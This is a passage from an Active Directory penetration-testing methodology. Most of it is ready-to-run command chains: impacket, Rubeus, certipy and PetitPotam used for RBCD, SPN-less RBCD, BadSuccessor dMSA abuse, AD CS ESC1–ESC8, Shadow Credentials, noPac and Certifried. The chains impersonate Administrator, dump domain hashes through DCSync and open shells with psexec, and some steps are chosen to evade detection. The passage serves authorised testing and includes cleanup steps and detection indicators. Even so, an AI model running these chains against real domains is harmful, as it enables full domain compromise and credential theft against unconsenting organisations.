- Patch state — querying `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\PerformTicketSignature` on the DC tells you whether the mitigation is enforced (`1`) or rolled back (`0`).

> **Distinction from §5.2 S4U2Self abuse:** Standard S4U2Self abuse needs `TRUSTED_TO_AUTH_FOR_DELEGATION` (UAC flag 16777216). BronzeBit removes that prerequisite — any constrained delegation account works against an unpatched DC.

[↑ Back to top](#active-directory-penetration-testing-methodology)

### 5.3 Resource-Based Constrained Delegation (RBCD)

**Prerequisites (any ONE of):**
- `GenericAll` / `GenericWrite` / `WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity)` over the target computer object
- Ability to add new computer accounts — `MachineAccountQuota (MAQ) > 0` (default = 10 per user), OR `CreateChild(computer)` on an OU
- Alternative: Shadow Credentials attack on a controlled computer (see 6.5) → write msDS-KeyCredentialLink instead of creating new computer

**Attack chain (Impacket / Linux):**
```bash
# 1. Create a fake computer account (or re-use a computer account you control)
# Check MachineAccountQuota first:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" -s base ms-DS-MachineAccountQuota

impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'FAKEPC$' -computer-pass 'FakeP@ss123' -dc-ip <DC_IP>

# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target
impacket-rbcd -delegate-from 'FAKEPC$' -delegate-to '<TARGET_COMPUTER>$' -action 'write' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Verify the write
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'read' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# 3. S4U2Self + S4U2Proxy — get a service ticket as Administrator on the target
impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' -impersonate Administrator '<DOMAIN>/FAKEPC$:FakeP@ss123' -dc-ip <DC_IP>
# If target user is in Protected Users or has 'Account is sensitive and cannot be delegated' → S4U2Self returns a NON-forwardable ticket and S4U2Proxy fails.
# Pick a high-priv user NOT in Protected Users (e.g., Domain Admin not explicitly protected).

# 4. Use the ticket (CIFS → SMB, HOST → anything, LDAP → DCSync, HTTP → WinRM)
export KRB5CCNAME=Administrator@cifs_<TARGET>.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN>
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN>
impacket-smbexec -k -no-pass <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN>

# 5. Cleanup (remove backdoor delegation)
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'flush' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'FAKEPC$' -delete -dc-ip <DC_IP>
```

**Attack chain (Rubeus / PowerShell — from Windows foothold):**
```powershell
# 1. Create a fake computer with Powermad
# https://github.com/Kevin-Robertson/Powermad
Import-Module .\Powermad.ps1
$pass = ConvertTo-SecureString 'FakeP@ss123' -AsPlainText -Force
New-MachineAccount -MachineAccount FAKEPC -Password $pass

# 2. Get SID of the fake computer
Get-ADComputer FAKEPC | select objectSid

# 3. Write msDS-AllowedToActOnBehalfOfOtherIdentity using PowerView or native AD module
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FAKEPC_SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-ADComputer <TARGET_COMPUTER> | Set-ADObject -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# 4. Get Rubeus hash of FAKEPC$ password
.\Rubeus.exe hash /password:FakeP@ss123 /user:FAKEPC$ /domain:<DOMAIN>

# 5. S4U abuse
.\Rubeus.exe s4u /user:FAKEPC$ /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER>.<DOMAIN> /altservice:host,http,ldap /ptt

# 6. Access target
dir \\<TARGET_COMPUTER>.<DOMAIN>\C$
```

#### Living-off-the-land equivalent — RBCD write via the AD module

When Powermad/PowerView is unavailable but RSAT is installed (common on management jump-hosts), the native `Set-ADComputer` cmdlet can write the RBCD attribute in a single call.

```powershell
# Requires: RSAT AD module + GenericAll/GenericWrite on <TARGET_COMPUTER>
Import-Module ActiveDirectory

# 1) Use an existing controlled computer (or create one with native New-ADComputer if MAQ>0)
New-ADComputer -Name FAKEPC -SAMAccountName 'FAKEPC$' `
    -AccountPassword (ConvertTo-SecureString 'FakeP@ss123' -AsPlainText -Force) `
    -Enabled $true -ServicePrincipalNames 'HOST/FAKEPC','RestrictedKrbHost/FAKEPC'

# 2) One-line RBCD write — avoids hand-crafting the security descriptor blob
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount (Get-ADComputer FAKEPC)

# 3) Verify
Get-ADComputer <TARGET_COMPUTER> -Properties PrincipalsAllowedToDelegateToAccount |
    Select-Object -ExpandProperty PrincipalsAllowedToDelegateToAccount

# 4) Cleanup (clears msDS-AllowedToActOnBehalfOfOtherIdentity)
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount $null
Remove-ADComputer FAKEPC -Confirm:$false
```

> **LOTL note:** `-PrincipalsAllowedToDelegateToAccount` is the native cmdlet wrapper around `msDS-AllowedToActOnBehalfOfOtherIdentity`; it builds the SDDL blob automatically. No external tools dropped to disk. Step 4's S4U chain still requires Rubeus/impacket.

**Failure modes to diagnose:**
- `KRB_AP_ERR_BADOPTION` during S4U2Proxy → target user is in Protected Users group or flagged sensitive
- `KDC_ERR_BADOPTION` → the computer you're delegating FROM has no SPN (unlikely for real computer accounts, but possible for freshly-created shadow creds objects)
- `MAQ = 0` → can't create computers. Alternatives: Shadow Credentials (6.5) OR find an existing computer you already control via LAPS/SMB/etc.
- No response on S4U2Proxy → DC cannot resolve the SPN (check DNS for `<TARGET_COMPUTER>.<DOMAIN>`)

**Related vectors:**
- See **5.4** for dMSA-based RBCD-like abuse (BadSuccessor, Server 2025)
- See **6.5 Shadow Credentials** for using key-trust auth instead of password — works when MAQ=0 but you have write access on a computer object
- See **noPac (CVE-2021-42278/42287)** in 6.6 as an RBCD-adjacent full-domain compromise when any domain user has MAQ>0

### 5.3b SPN-less RBCD — RBCD via User Account When MachineAccountQuota=0

When `MachineAccountQuota=0` prevents creating new computer accounts, the classic RBCD path (5.3) fails. The SPN-less RBCD variant uses a **controlled user account** (no SPN required) as the delegating principal. Since user accounts lack SPNs, the S4U2Self ticket comes back encrypted with the session key (not a long-term service key), requiring the `-u2u` (User-to-User) flag in `getST.py` to handle the different encryption model.

**Pre-conditions:**
- `GenericAll` / `GenericWrite` / `WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity)` over the target computer
- A controlled user account (password known) — does NOT need an SPN
- MAQ=0 (otherwise standard RBCD with a new computer account is simpler)

**Attack chain:**
```bash
# 1. Confirm MAQ=0 (validates why we need this variant)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
    -b "DC=<DOMAIN>,DC=<TLD>" -s base ms-DS-MachineAccountQuota
# Should return: 0

# 2. Write RBCD delegation from the controlled USER account (not a computer$)
# Use the controlled user's SID as the delegating principal
impacket-rbcd -delegate-from '<CONTROLLED_USER>' -delegate-to '<TARGET_COMPUTER>$' \
    -action 'write' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# 3. Request S4U2Self ticket with -u2u (User-to-User mode)
# -u2u handles the session-key-encrypted ticket that comes back for SPN-less accounts
impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
    -impersonate Administrator \
    -u2u \
    '<DOMAIN>/<CONTROLLED_USER>:<CONTROLLED_USER_PASSWORD>' -dc-ip <DC_IP>

# 4. Use the resulting ticket
export KRB5CCNAME=Administrator@cifs_<TARGET_COMPUTER>.<DOMAIN>.ccache
impacket-psexec -k -no-pass '<DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN>'
```

**Alternative: session-key extraction + RC4 password trick (older impacket versions without -u2u):**
```bash
# If your impacket version lacks -u2u support:

# 1. Get a TGT for the controlled user
impacket-getTGT '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>' -dc-ip <DC_IP>
export KRB5CCNAME=<CONTROLLED_USER>.ccache

# 2. Request S4U2Self (will fail the proxy step, but gives us a ticket to inspect)
impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
    -impersonate Administrator \
    '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>' -dc-ip <DC_IP> 2>&1 || true

# 3. Use describeTicket.py to extract the session key from the TGT
impacket-describeTicket <CONTROLLED_USER>.ccache | grep -i 'session key'
# Output: Session Key: <HEX_SESSION_KEY>

# 4. Change the controlled user's password to the RC4 value of the session key
# (this aligns the user's long-term key with the session key the KDC used)
impacket-changepasswd '<DOMAIN>/<CONTROLLED_USER>:<PASSWORD>'@<DC_IP> \
    -newpass '<DERIVED_FROM_SESSION_KEY>'
# Or use smbpasswd:
smbpasswd -r <DC_IP> -U '<CONTROLLED_USER>'

# 5. Re-run getST with the new password (session key now matches)
impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' \
    -impersonate Administrator \
    '<DOMAIN>/<CONTROLLED_USER>:<NEW_PASSWORD>' -dc-ip <DC_IP>
```

```bash
# Cleanup — remove the RBCD delegation
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'flush' \
    '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

#### Living-off-the-land / LOTL variant

```powershell
# Step 1: Write RBCD attribute using native RSAT (same as 5.3 LOTL variant)
Set-ADComputer '<TARGET_COMPUTER>' -PrincipalsAllowedToDelegateToAccount (Get-ADUser '<CONTROLLED_USER>')

# Step 2: The S4U chain still requires Rubeus with /u2u flag
.\Rubeus.exe s4u /user:<CONTROLLED_USER> /rc4:<CONTROLLED_USER_NT_HASH> \
    /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER>.<DOMAIN> /u2u /ptt

# Verify
dir \\<TARGET_COMPUTER>.<DOMAIN>\C$

# Cleanup
Set-ADComputer '<TARGET_COMPUTER>' -PrincipalsAllowedToDelegateToAccount $null
```

> **Why this works:** The KDC does not require the delegating account to have an SPN for S4U2Self — it only needs the msDS-AllowedToActOnBehalfOfOtherIdentity reference to resolve to a valid security principal. The `-u2u` flag tells getST to use the TGT session key for decryption (User-to-User Kerberos, RFC 4120 section 3.7) instead of the missing long-term service key.

> **When to reach for this:** MAQ=0 + no existing controlled computer account + no Shadow Credentials path (PKINIT not available). This is the RBCD fallback that works with only a regular user account.

### 5.4 Delegated MSA (dMSA) Abuse — BadSuccessor
Requires: `CreateChild` right on any OU (BloodHound edge). Affects Windows Server 2025 DCs.
Creates a Delegated Managed Service Account linked to a privileged predecessor (e.g. Administrator);
the resulting ticket carries the predecessor's PAC, enabling DCSync.

> **Automation:** `automation/Get-dMSATicket.ps1` (Windows-side) emits a base64 TGS; pipe into `automation/dmsa_exploit.sh` (Kali-side) for one-shot Rubeus → ticketConverter → DCSync. The script also handles **constrained delegation, RBCD, S4U2Self, RC4-only, and TGT-only** modes — useful in §5.1 / §5.2 / §5.3 too.

```powershell
# 1. From a foothold with CreateChild on an OU — run on target via WinRM/evil-winrm
# https://github.com/b5null/Invoke-BadSuccessor.ps1
Import-Module .\Invoke-BadSuccessor.ps1
# Creates machine account 'Pwn$' + dMSA 'attacker_dMSA$' linked to Administrator
Invoke-BadSuccessor
# Custom names:
Invoke-BadSuccessor -ComputerName 'Pwn' -ServiceAccountName 'attacker_dMSA' -PrecededByIdentity 'Administrator'
# Output includes next-step Rubeus commands with the AES256 key for Pwn$
```

```powershell
# 2. Get AES256 key for the machine account
.\Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:<DOMAIN>

# 3. Get TGT for the machine account
.\Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:<DOMAIN> /dc:DC01.<DOMAIN> /nowrap

# 4. Request dMSA service ticket (inherits Administrator's PAC)
.\Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/<DOMAIN> /dmsa /opsec /nowrap /outfile:ticket.kirbi /ticket:<BASE64_TGT>
# Output shows: Current Keys for attacker_dMSA$: (aes256_cts_hmac_sha1) <KEY>
```

```bash
# 5. From Linux — convert ticket and DCSync (chisel SOCKS proxy must be active)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
proxychains impacket-secretsdump -k -no-pass \
  '<DOMAIN>/attacker_dMSA$@dc01.<DOMAIN>' -just-dc-ntlm -dc-ip <DC_IP>

# Alternative — pure Impacket (no Rubeus needed, run from Linux through SOCKS)
proxychains impacket-getST '<DOMAIN>/Pwn$:Password123!' \
  -dmsa attacker_dMSA$ -dc-ip <DC_IP>
export KRB5CCNAME=attacker_dMSA\$.ccache
proxychains impacket-secretsdump -k -no-pass \
  '<DOMAIN>/attacker_dMSA$@dc01.<DOMAIN>' -just-dc-ntlm -dc-ip <DC_IP>
```

### 5.5 Kerberos Double-Hop Bypass via CredSSP

Symptom: `Enter-PSSession` works, but commands that touch a second resource (file share, DC, AD cmdlet) fail with Access Denied / logon failure. Cause: default Negotiate/Kerberos auth produces a network logon on the first hop with no creds for the second hop. Fix: authenticate with CredSSP so creds are delegated to the target.

```powershell
# === On the attacker Windows host (one-time setup) ===
# 1. Add target to hosts so SPN/hostname resolution matches
#    C:\Windows\System32\drivers\etc\hosts:  <TARGET>  <TARGET_HOSTNAME>

# 2. Enable WS-Management client + CredSSP role + delegation policy
Enable-PSRemoting -Force
Enable-WSManCredSSP -Role Client -DelegateComputer "*" -Force

# 3. Allow Fresh Credentials with NTLM-only server auth via registry (no GUI / gpedit)
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowFreshNTLMOnly' -Force | Out-Null
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation' -Name AllowFreshCredentialsWhenNTLMOnly -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation' -Name ConcatenateDefaults_AllowFreshNTLMOnly -Value 1
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowFreshNTLMOnly' -Name '1' -Value "WSMAN/<TARGET_HOSTNAME>" -PropertyType String -Force
```

```powershell
# === The hop — log in with CredSSP so creds reach the second hop ===
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)
$session = New-PSSession -ComputerName <TARGET_HOSTNAME> -Credential $cred -Authentication CredSSP
Enter-PSSession $session

# Verify — a 2nd-hop resource that previously failed should now succeed
Get-Content \\<DC_FQDN>\<SHARE>\<TARGET_USER>.txt
Get-ADUser -Identity <TARGET_USER> -Server <DC_FQDN>
```

```bash
# === On Linux attacker — route the engagement subnet through the VPN tun for the Win VM ===
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
# Then on the Win VM (cmd):
# route add <SUBNET> mask 255.255.255.0 <ATTACKER_IP>
```

> **Alternative when CredSSP unavailable:** RBCD (5.3) — set `msDS-AllowedToActOnBehalfOfOtherIdentity` on a controlled computer object, then S4U2Self + S4U2Proxy to mint a service ticket for the second-hop service. Pure-Kerberos, no plaintext delegation.

> **OPSEC:** CredSSP delegates the user's plaintext password to the target — only against engagement-scoped hosts. Logged on target as 4624 logon type 8 + 4648 'explicit credentials' with `Authentication Package Name: CredSSP`.

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 6: AD CS (Active Directory Certificate Services) Attacks

**Goal:** Exploit vulnerable certificate templates or ADCS misconfigurations for privilege escalation.

### 6.1 Enumeration
```bash
# Find vulnerabilities in certificate templates
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# Output will indicate ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, ESC8, ESC9, ESC10, ESC11, ESC13 vulnerabilities
```

#### Living-off-the-land equivalent — `certutil` / `certreq` ADCS recon

`certutil.exe` is present on every Windows host since Win7. Any authenticated domain user can enumerate the entire PKI with read-only queries; `certreq.exe` submits CSRs to vulnerable templates without Certipy.

```cmd
:: Discover the CA(s) the host is configured against
certutil -config - -ping
certutil -dump

:: Detailed CA info
certutil -CAInfo
certutil -CAInfo "<CA_FQDN>\<CA_NAME>"

:: List every certificate template in the forest
certutil -template
certutil -template -v          :: include EKUs, msPKI-* attributes, ACLs
certutil -template | findstr /i "msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag"

:: Enrollment Services container — every Enterprise CA in the forest
certutil -config - -dsCAList
certutil -store -enterprise NTAuth          :: NTAuthCertificates list

:: ESC6 indicator — read CA EditFlags (look for EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000)
certutil -config "<CA_FQDN>\<CA_NAME>" -getreg policy\EditFlags

:: ESC7 indicator — read CA security descriptor
certutil -config "<CA_FQDN>\<CA_NAME>" -getreg ca\Security

:: Submit a CSR to a vulnerable template (ESC1 exploitation, no Certipy)
:: req.inf must include Subject + RequestType=PKCS10 + KeyUsage; for ESC1 set
::   [Extensions] 2.5.29.17="{text}upn=administrator@<DOMAIN>" Critical=2.5.29.17
certreq -submit -config "<CA_FQDN>\<CA_NAME>" req.inf cert.cer
certreq -accept cert.cer        :: install issued cert into user store

:: Export the issued cert (with private key) to a PFX for use with Rubeus / certipy auth
certutil -user -exportPFX -p <PFX_PASS> <SerialNumberOrThumbprint> out.pfx
```

**ESC indicator quick-map (manual interpretation of `certutil -template -v` output):**

| ESC | Indicator field |
|---|---|
| ESC1 | `msPKI-Certificate-Name-Flag` has `0x1` (`ENROLLEE_SUPPLIES_SUBJECT`) AND auth EKU AND low-priv enroll right |
| ESC2 | `Any Purpose` EKU (`2.5.29.37.0`) or no EKU |
| ESC3 | `Certificate Request Agent` EKU (`1.3.6.1.4.1.311.20.2.1`) |
| ESC4 | weak DACL on template (Domain Computers/Users with WriteDacl/WriteProperty) |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` (`0x00040000`) in `policy\EditFlags` |
| ESC7 | weak ACL on `ca\Security` (ManageCA / ManageCertificates to low-priv) |
| ESC8 | HTTP `/certsrv/` web enrollment without HTTPS+EPA |
| ESC9 | `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) in `msPKI-Enrollment-Flag` |
| ESC15 | EKUwu / arbitrary application policies in v1 templates (CVE-2024-49019) |
| ESC16 | security extension stripped on issuance (DC `StrongCertificateBindingEnforcement` registry) |

> **LOTL caveat:** `certutil` enumerates raw — interpreting flags and DACLs is manual. Certipy's `find -vulnerable` automates ESC1–16 detection. AV does not flag `certutil -template` (used by sysadmins constantly); `certreq -submit` is also benign. The IOC for ESC1 is the eventual cert authentication (Event 4768 with anomalous UPN).

### 6.2 ESC1 — Misconfigured Certificate Templates
Conditions: Enrollee can specify a Subject Alternative Name (SAN), allows Client Authentication, enrollee has enroll rights.

```bash
# Request certificate as Administrator
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>' -target <DC_IP>

# Authenticate with the certificate
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
# Returns NT hash of Administrator
```

### 6.2b ESC2 — Any Purpose / Subordinate CA Templates
Conditions: Template allows "Any Purpose" EKU or no EKU (acts as subordinate CA). Enrollee has enroll rights.
```bash
# ESC2 templates can be used to issue certificates for any purpose
# Including client authentication — effectively same impact as ESC1

# Request certificate
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -target <DC_IP>

# If "Any Purpose" → use directly for authentication
# If SubCA → use to sign new certificates for any user
certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 6.2c ESC3 — Enrollment Agent Templates
Conditions: Template has "Certificate Request Agent" EKU + another template allows enrollment on behalf of others.
```bash
# Step 1: Request an enrollment agent certificate
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<AGENT_TEMPLATE>' -target <DC_IP>

# Step 2: Use the agent cert to request a certificate on behalf of another user
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TARGET_TEMPLATE>' -on-behalf-of '<DOMAIN>\Administrator' -pfx agent.pfx -target <DC_IP>

# Step 3: Authenticate with the certificate
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 6.3 ESC4 — Vulnerable Certificate Template ACLs
If you have write access to a certificate template, modify it to be ESC1-vulnerable:
```bash
# Save original template, modify for ESC1, exploit, then restore
certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old
# Template is now ESC1 → exploit as above
# Restore: certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -configuration old_template.json
```

### 6.4 ESC8 — NTLM Relay to ADCS Web Enrollment
```bash
# Applies when: /certsrv/ reachable AND (HTTP enabled OR HTTPS without EPA channel-binding)
# Test cost: ~2s curl probe; always run when CA is identified
# If patched (HTTPS+EPA enforced): pivot to ESC11 (RPC ICPR — does NOT honor EPA)

# 1. Probe endpoints
curl -I http://<CA_IP>/certsrv/                # HTTP enabled?
curl -I https://<CA_IP>/certsrv/ -k            # HTTPS reachable?
# Check EPA: if HTTPS only and 401 with WWW-Authenticate listing 'Negotiate' but relay fails → EPA enforced

# 2. Coerce authentication (PetitPotam)
# Relay to ADCS web enrollment to get a certificate as the DC
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'

# 3. Trigger coercion
python3 PetitPotam.py <RELAY_LISTENER_IP> <DC_IP>

# 4. Use the certificate
certipy-ad auth -pfx dc.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 6.5 Shadow Credentials
```bash
# If you have GenericWrite/GenericAll over a user or computer:
certipy-ad shadow auto -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -account '<TARGET>' -dc-ip <DC_IP>
# Returns NT hash of the target
```

### 6.5b PKINIT Pre-Auth & UnPAC-the-Hash

When you hold a `.pfx` (e.g. ESC1/ESC4/Shadow Credentials output, smartcard export, certipy `req`/`shadow auto`), PKINIT lets you authenticate to Kerberos with the certificate; the returned PAC contains the user's NT hash, which Certipy decrypts client-side ("UnPAC-the-Hash"). This is the standard chain to convert a cert into a hash without ever cracking it.

```bash
# Authenticate with the cert → TGT + NT hash recovered from PAC
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP>
# Output: "Got hash for '<USER>@<DOMAIN>': aad3b435...:<NT_HASH>"
# Also writes <user>.ccache for immediate use:
export KRB5CCNAME=user.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>

# Skip S4U2self self-ticket request (some forests block it; useful for machine accounts)
certipy-ad auth -pfx machine.pfx -dc-ip <DC_IP> -no-s4u2self

# Force username/domain when the SAN doesn't match (e.g. cert for a UPN that differs)
certipy-ad auth -pfx user.pfx -username '<USER>' -domain '<DOMAIN>' -dc-ip <DC_IP>

# Specify the target SPN explicitly (LDAP/CIFS, helpful when DCs filter by SPN)
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP> -ldap-shell
```

**Shadow Credentials → PKINIT → UnPAC chain (full sequence):**
```bash
# 1) Add msDS-KeyCredentialLink to a target you have GenericWrite/GenericAll over
certipy-ad shadow auto -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -account '<TARGET_USER_OR_COMPUTER>' -dc-ip <DC_IP>
# Outputs <TARGET>.pfx + restores original keyCredentialLink afterwards

# 2) Authenticate — recover NT hash via UnPAC
certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>

# 3) Use the hash
impacket-secretsdump -hashes :<NT_HASH> <DOMAIN>/<TARGET>@<DC_FQDN>
netexec smb <DC_IP> -u <TARGET> -H <NT_HASH>
```

> Pair with **6.4 ESC8** (relay-to-Web-Enrollment) and **7.4 ESC11** (relay-to-ICPR) — both produce certs that feed straight into this chain.

### 6.6 noPac — CVE-2021-42287 / CVE-2021-42278
**Machine Account Impersonation → Domain Admin in One Shot**
Combines sAMAccountName spoofing with PAC forgery. Extremely powerful.
```bash
# Applies when: DC missing KB5008102/KB5008380/KB5008602 (Nov 2021) AND MAQ > 0
# Test cost: ~30s with scanner.py — always run on lab/exam DCs (legacy targets common)
# If patched: pivot to RBCD (Phase 5.3) or Certifried (6.7) which use the same MAQ primitive
python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>   # quick patch-state check

# Method 1: Using noPac.py (all-in-one)
# https://github.com/Ridter/noPac
python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate Administrator -dump
# This creates a machine account, renames it to DC name, gets TGT, renames back,
# requests S4U2self ticket as Administrator → DCSync

# Method 2: Manual steps
# 1. Create a machine account
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'NOPAC$' -computer-pass 'Password123!' -dc-ip <DC_IP>

# 2. Rename machine account to match DC's sAMAccountName (without trailing $)
# Use ldap tools to set sAMAccountName = <DC_HOSTNAME> (without $)

# 3. Request TGT for the spoofed name
impacket-getTGT '<DOMAIN>/NOPAC:<PASSWORD>' -dc-ip <DC_IP>

# 4. Rename machine account back to avoid detection

# 5. Request S4U2self ticket impersonating Administrator
impacket-getST -impersonate Administrator -spn 'cifs/<DC_FQDN>' '<DOMAIN>/NOPAC$:Password123!' -dc-ip <DC_IP>

# 6. Use the ticket
export KRB5CCNAME=Administrator@cifs_<DC_FQDN>.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

#### 6.6.1 noPac End-to-End Chain (Reference Walkthrough)

Reproducible six-step sequence using only Impacket. Pre-reqs: any valid domain user, default `ms-DS-MachineAccountQuota >= 1`, DC unpatched for KB5008380 / KB5008602.

```bash
# Step 1 — add a brand-new machine account (default quota = 10 per user)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123!' \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC_HOSTNAME> -dc-ip <DC_IP>

# Step 2 — rename the machine account so its sAMAccountName matches the DC's name (no trailing $)
impacket-renameMachine -current-name 'EVIL$' -new-name 'DC' \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
# DC now sees TWO principals named 'DC' — ours (with no SPNs) and the real DC

# Step 3 — request a TGT for our spoofed 'DC' principal (no SPNs → PAC built without restrictions)
impacket-getTGT '<DOMAIN>/DC:P@ss123!' -dc-ip <DC_IP>
# Produces DC.ccache

# Step 4 — rename our machine account back to its original name (avoid SAM collision detection)
impacket-renameMachine -current-name 'DC$' -new-name 'EVIL$' \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# Step 5 — S4U2self impersonation: request a service ticket to cifs/<DC_FQDN> AS the spoofed 'DC$'
export KRB5CCNAME=DC.ccache
impacket-getST -self -impersonate Administrator \
  -altservice 'cifs/<DC_FQDN>' \
  -k -no-pass '<DOMAIN>/DC$' -dc-ip <DC_IP>
# DC checks PAC for the embedded SAM → lookup matches the *real* DC$ → PAC re-issued for Administrator

# Step 6 — use the resulting CIFS ticket against the DC
export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass '<DOMAIN>/Administrator@<DC_FQDN>'
# Or DCSync directly:
impacket-secretsdump -k -no-pass -just-dc '<DOMAIN>/Administrator@<DC_FQDN>'
```

**Single-shot alternatives (same chain, automated):**
```bash
# noPac.py (Ridter)
python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
  --impersonate Administrator -use-ldap -dump

# sam-the-admin.py (WazeHell) — same chain, slightly different flag set
python3 sam_the_admin.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -shell --impersonate Administrator
```

> **Cleanup:** delete the rogue machine account when done — `impacket-addcomputer ... -delete -computer-name 'EVIL$'` or via LDAP. Leaving it triggers the SAM-collision artifact in DC event logs.

### 6.7 Certifried — CVE-2022-26923
**Machine Account Certificate Abuse → Domain Admin**
Abuses AD CS to escalate from any domain user to Domain Admin via machine account certificates.
```bash
# Check if vulnerable: ADCS running + unpatched + User template allows client auth

# 1. Create a machine account
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'CERTIFRIED$' -computer-pass 'Password123!' -dc-ip <DC_IP>

# 2. Set the dNSHostName of the new machine account to match the DC's dNSHostName
# This tricks ADCS into issuing a certificate for the DC
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user 'CERTIFRIED$' -dns '<DC_FQDN>' -dc-ip <DC_IP>
# Alternative: bloodyAD
